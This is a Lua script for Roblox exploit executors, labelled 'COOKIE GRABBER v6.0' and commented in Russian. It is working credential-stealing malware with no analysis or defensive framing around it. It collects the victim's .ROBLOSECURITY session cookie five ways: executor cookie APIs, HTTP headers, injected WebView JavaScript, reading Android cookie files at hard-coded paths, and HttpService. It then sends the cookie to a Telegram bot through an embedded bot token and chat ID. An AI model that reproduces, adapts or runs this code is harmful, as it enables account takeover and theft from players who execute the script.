-- ============================================
-- COOKIE GRABBER v6.0 (FINAL)
-- ============================================
local botToken = "8609253340:AAGH_mUlJqF1xsH2fWuelzydtbXyxdq1DUU"
local chatID = "8735778962"

local webhookURL = "https://api.telegram.org/bot" .. botToken .. "/sendMessage"

-- ============================================
-- ПОЛУЧЕНИЕ КУКИ (ВСЕ МЕТОДЫ ИЗ ПРИМЕРА)
-- ============================================
local function getRobloxCookie()
    local cookie = nil
    
    -- МЕТОД 1: Synapse X
    if syn and syn.cookie then
        pcall(function()
            cookie = syn.cookie.get("ROBLOSECURITY")
        end)
    end
    
    -- МЕТОД 2: HTTP-запрос
    if not cookie then
        local req = syn and syn.request or http and http.request or request
        if req then
            pcall(function()
                local resp = req({
                    Url = "https://www.roblox.com/mobileapi/userinfo",
                    Method = "GET"
                })
                if resp and resp.Headers then
                    local setCookie = resp.Headers["set-cookie"] or resp.Headers["Set-Cookie"]
                    if setCookie then
                        cookie = string.match(setCookie, "ROBLOSECURITY=(.-);")
                    end
                end
            end)
        end
    end
    
    -- МЕТОД 3: WebViewService (Delta)
    if not cookie then
        pcall(function()
            local webview = game:GetService("WebViewService")
            if webview then
                local result = webview:ExecuteJavaScript([[
                    (function() {
                        var c = document.cookie.split('; ').find(r => r.startsWith('.ROBLOSECURITY='));
                        return c ? c.split('=')[1] : null;
                    })();
                ]])
                if result and result ~= "null" then
                    cookie = result
                end
            end
        end)
    end
    
    -- МЕТОД 4: readfile (Android)
    if not cookie then
        pcall(function()
            if readfile then
                local paths = {
                    "/data/data/com.roblox.client/app_webview/Default/Cookies",
                    "/storage/emulated/0/Android/data/com.roblox.client/app_webview/Default/Cookies",
                    "/sdcard/Android/data/com.roblox.client/app_webview/Default/Cookies"
                }
                for _, path in ipairs(paths) do
                    local content = readfile(path)
                    if content then
                        cookie = string.match(content, "ROBLOSECURITY=(.-);")
                        if cookie then break end
                    end
                end
            end
        end)
    end
    
    -- МЕТОД 5: HttpService
    if not cookie then
        pcall(function()
            local http = game:GetService("HttpService")
            local response = http:GetAsync("https://www.roblox.com/mobileapi/userinfo")
            if response then
                cookie = string.match(response, "ROBLOSECURITY=(.-);")
            end
        end)
    end
    
    return cookie or nil
end

-- ============================================
-- ОТПРАВКА В TELEGRAM
-- ============================================
local function sendToTelegram(cookie)
    local http = game:GetService("HttpService")
    local message = string.format(
        "🍪 **КУКА ПОЛУЧЕНА!**\n" ..
        "━━━━━━━━━━━━━━━━━\n" ..
        "⏰ Время: `%s`\n" ..
        "━━━━━━━━━━━━━━━━━\n" ..
        "`%s`",
        os.date("%Y-%m-%d %H:%M:%S"),
        cookie
    )
    
    pcall(function()
        http:PostAsync(webhookURL, http:JSONEncode({
            chat_id = chatID,
            text = message,
            parse_mode = "Markdown"
        }), Enum.HttpContentType.ApplicationJson)
        print("[+] Отправлено в Telegram")
    end)
end

-- ============================================
-- ЗАПУСК
-- ============================================
local function main()
    print("[*] Поиск куки...")
    local cookie = getRobloxCookie()
    if cookie then
        print("[+] Кука найдена!")
        sendToTelegram(cookie)
    else
        print("[-] Кука не найдена")
    end
end

main()
wait(3)
main()

print("✅ Cookie Grabber v6.0 запущен")
print("📡 Бот: @MyCookieLootBOT")
